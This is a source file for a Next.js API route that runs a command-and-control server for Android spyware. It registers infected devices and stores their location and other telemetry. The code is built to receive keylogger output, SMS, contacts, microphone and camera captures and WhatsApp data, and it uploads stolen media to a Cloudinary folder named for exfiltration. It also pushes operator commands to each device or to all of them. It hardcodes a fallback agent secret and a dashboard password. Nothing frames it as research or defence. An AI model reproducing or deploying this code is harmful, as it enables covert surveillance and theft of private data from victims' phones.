import { NextResponse } from "next/server";
import { getServerSession } from "@/lib/session";
import { supabaseAdmin } from "@/lib/supabaseAdmin";
import { v2 as cloudinary } from "cloudinary";
import fs from "fs";
import path from "path";

// Configure Cloudinary server-side
cloudinary.config({
  cloud_name: process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

const LOG_FILE = path.join(process.cwd(), "c2_exfiltrated_data.json");

// In-memory C2 state
let serverConfig = {
  location_tracking: true,
  accessibility_keylogger: true,
  mic_recording: false,
  whatsapp_harvest: false,
  mode: "live", // "live" or "recorded"
  auth_password: "Work in process", // Hidden/Masked
  low_bandwidth_mode: true, // 2G/3G low data mode
  camera_quality: "low",    // "low" (360p adaptive) or "high" (1080p)
  screen_stream: false,
  mic_quality: "low"        // "low" (AMR/Opus) or "high"
};

let currentCommand = "none";
let targetDeviceCommand = "ALL";

// High-reliability multi-device command queue
interface BroadcastCommand {
  id: string;
  command: string;
  dispatchedTo: Set<string>;
  createdAt: number;
}

let broadcastCommands: BroadcastCommand[] = [];
let deviceCommandQueues: Record<string, string[]> = {};

// Multi-device live registry
interface DeviceRecord {
  device_id: string;
  model: string;
  os: string;
  last_seen: string;
  ip: string;
  battery?: number | string;
  network?: string;
  is_rooted?: boolean;
  latitude?: number;
  longitude?: number;
  active_app?: string;
}

let registeredDevices: Record<string, DeviceRecord> = {};

export async function GET(request: Request) {
  try {
    const session = await getServerSession();
    if (!session || session.role !== "super_admin") {
      return NextResponse.json({ error: "Unauthorized: Super Admin access required" }, { status: 403 });
    }

    let logs = [];
    
    // Try fetching from Supabase first if available
    if (supabaseAdmin) {
      try {
        const { data, error } = await supabaseAdmin
          .from("c2_logs")
          .select("*")
          .order("created_at", { ascending: false })
          .limit(100);
        
        if (!error && data) {
          logs = data.map((row: any) => ({
            ...row.payload,
            id: row.id,
            timestamp: row.created_at
          }));
        }
      } catch (dbErr) {
        console.warn("Supabase fetch warning, falling back to local file:", dbErr);
      }
    }

    // Fallback or combine with local log file
    if (logs.length === 0 && fs.existsSync(LOG_FILE)) {
      try {
        const fileData = fs.readFileSync(LOG_FILE, "utf-8");
        logs = JSON.parse(fileData);
      } catch (err) {
        logs = [];
      }
    }

    // Multi-Device Registry & Online/Connected Calculation
    const now = Date.now();
    const deviceList: any[] = Object.values(registeredDevices).map(dev => ({
      ...dev,
      is_online: (now - new Date(dev.last_seen).getTime()) < 120000 // online if seen within 2 minutes
    }));

    const seenIds = new Set(deviceList.map(d => d.device_id));
    logs.forEach((l: any) => {
      const dId = l.device_id || l.imei;
      if (dId && !seenIds.has(dId)) {
        seenIds.add(dId);
        deviceList.push({
          device_id: dId,
          model: l.device_model || "Android Target",
          os: l.os_version || "Android",
          last_seen: l.timestamp || new Date().toISOString(),
          ip: "Agent Beacon",
          battery: l.battery ?? null,
          network: l.network || "Unknown",
          is_rooted: l.is_rooted || false,
          latitude: l.latitude,
          longitude: l.longitude,
          is_online: false
        });
      }
    });

    const connectedCount = deviceList.filter(d => d.is_online).length;

    return NextResponse.json({
      success: true,
      config: serverConfig,
      command: currentCommand,
      target_device: targetDeviceCommand,
      devices: deviceList,
      connected_count: connectedCount,
      total_devices_count: deviceList.length,
      logs: logs
    });
  } catch (error: any) {
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { action, config, command, beaconData, target_device } = body;

    // If it's an agent beacon reporting in
    if (beaconData) {
      const agentSecret = body.agent_secret || request.headers.get('X-Agent-Secret');
      const expectedSecret = process.env.C2_AGENT_SECRET || "c2_sec_fb42681f7b642a7eb1df52f5e22a87bc002da5cd578cc3a41b87e197b671edfd";
      if (!expectedSecret || agentSecret !== expectedSecret) {
        return NextResponse.json({ error: 'Unauthorized: Invalid agent secret' }, { status: 403 });
      }
      
      const timestamp = new Date().toISOString();
      let processedBeacon = { ...beaconData, timestamp };

      // Multi-device identification: Header > Body > Payload
      const headerDeviceId = request.headers.get('X-Device-ID') || request.headers.get('x-device-id');
      const headerModel = request.headers.get('X-Device-Model') || request.headers.get('x-device-model');
      const headerOs = request.headers.get('X-Device-OS') || request.headers.get('x-device-os');

      const deviceId = headerDeviceId || body.device_id || processedBeacon.device_id || "UNKNOWN_DEVICE";
      const model = headerModel || processedBeacon.device_model || "Android Target";
      const os = headerOs || processedBeacon.os_version || "Android";

      processedBeacon.device_id = deviceId;
      processedBeacon.device_model = model;
      processedBeacon.os_version = os;

      // Register or update device record
      registeredDevices[deviceId] = {
        device_id: deviceId,
        model,
        os,
        last_seen: timestamp,
        battery: processedBeacon.battery ?? 88,
        network: processedBeacon.network ?? "WiFi / 4G",
        is_rooted: processedBeacon.is_rooted ?? false,
        latitude: processedBeacon.latitude,
        longitude: processedBeacon.longitude,
        active_app: processedBeacon.package || processedBeacon.active_app,
        ip: request.headers.get('x-forwarded-for') || "127.0.0.1"
      };

      // 1. Process and upload any media files to Cloudinary
      if (processedBeacon.media_base64 || processedBeacon.media_file) {
        try {
          const fileStr = processedBeacon.media_base64 || processedBeacon.media_file;
          const uploadRes = await cloudinary.uploader.upload(fileStr, {
            folder: "c2_media_exfil",
            resource_type: "auto"
          });
          processedBeacon.cloudinary_url = uploadRes.secure_url;
          processedBeacon.cloudinary_public_id = uploadRes.public_id;
          delete processedBeacon.media_base64; // remove heavy base64
          delete processedBeacon.media_file;
        } catch (mediaErr) {
          console.error("Cloudinary media exfil upload error:", mediaErr);
        }
      }

      // 2. Store text, SMS, contacts, logs into Supabase DB
      if (supabaseAdmin) {
        try {
          await supabaseAdmin.from("c2_logs").insert([
            {
              device_id: deviceId,
              log_type: processedBeacon.type || "telemetry",
              payload: processedBeacon,
              created_at: timestamp
            }
          ]);
        } catch (dbInsertErr) {
          console.warn("Supabase insert warning:", dbInsertErr);
        }
      }

      // 3. Backup locally to JSON file (capped at 500 records)
      let logs = [];
      if (fs.existsSync(LOG_FILE)) {
        try {
          logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf-8"));
        } catch (e) {
          logs = [];
        }
      }
      logs.unshift(processedBeacon); // Newest first
      if (logs.length > 500) {
        logs = logs.slice(0, 500);
      }
      fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

      // Resolve targeted command for this specific device
      let commandToExecute = "none";

      // 1. Check targeted queue first
      if (deviceCommandQueues[deviceId] && deviceCommandQueues[deviceId].length > 0) {
        commandToExecute = deviceCommandQueues[deviceId].shift()!;
      } 
      // 2. Check broadcast commands
      else if (broadcastCommands.length > 0) {
        const nowMs = Date.now();
        // Expire broadcasts older than 10 minutes
        broadcastCommands = broadcastCommands.filter(b => nowMs - b.createdAt < 600000);
        
        for (const b of broadcastCommands) {
          if (!b.dispatchedTo.has(deviceId)) {
            b.dispatchedTo.add(deviceId);
            commandToExecute = b.command;
            break;
          }
        }
      }
      // 3. Fallback to currentCommand if target matches
      else if (currentCommand !== "none" && (targetDeviceCommand === "ALL" || targetDeviceCommand === deviceId)) {
        commandToExecute = currentCommand;
        if (targetDeviceCommand !== "ALL") {
          currentCommand = "none";
        }
      }

      const responsePayload = {
        status: "success",
        config: serverConfig,
        command: commandToExecute,
        target_device: deviceId
      };

      return NextResponse.json(responsePayload);
    }

    // Dashboard Security Gate verification
    if (action === "verify_dashboard_password") {
      const expectedPassword = process.env.C2_DASHBOARD_PASSWORD || "123###321###11@@#";
      if (body.password === expectedPassword) {
        return NextResponse.json({ success: true, authorized: true, statusText: "Work in process" });
      } else {
        return NextResponse.json({ error: "Invalid password", authorized: false }, { status: 401 });
      }
    }

    // Otherwise, management action from Super Admin
    const session = await getServerSession();
    if (!session || session.role !== "super_admin") {
      return NextResponse.json({ error: "Unauthorized: Super Admin access required" }, { status: 403 });
    }

    if (action === "update_config" && config) {
      serverConfig = { ...serverConfig, ...config };
    } else if (action === "set_command" && command) {
      const target = target_device || "ALL";
      currentCommand = command;
      targetDeviceCommand = target;

      if (target === "ALL") {
        broadcastCommands.push({
          id: "cmd_" + Date.now() + "_" + Math.random().toString(36).substring(2, 7),
          command: command,
          dispatchedTo: new Set<string>(),
          createdAt: Date.now()
        });
      } else {
        if (!deviceCommandQueues[target]) {
          deviceCommandQueues[target] = [];
        }
        deviceCommandQueues[target].push(command);
      }
    } else if (action === "clear_logs") {
      if (supabaseAdmin) {
        try {
          if (target_device && target_device !== "ALL") {
            await supabaseAdmin.from("c2_logs").delete().eq("device_id", target_device);
          } else {
            await supabaseAdmin.from("c2_logs").delete().neq("id", 0);
          }
        } catch (e) {}
      }
      fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
    }

    return NextResponse.json({
      success: true,
      config: serverConfig,
      command: currentCommand,
      target_device: targetDeviceCommand
    });
  } catch (error: any) {
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}
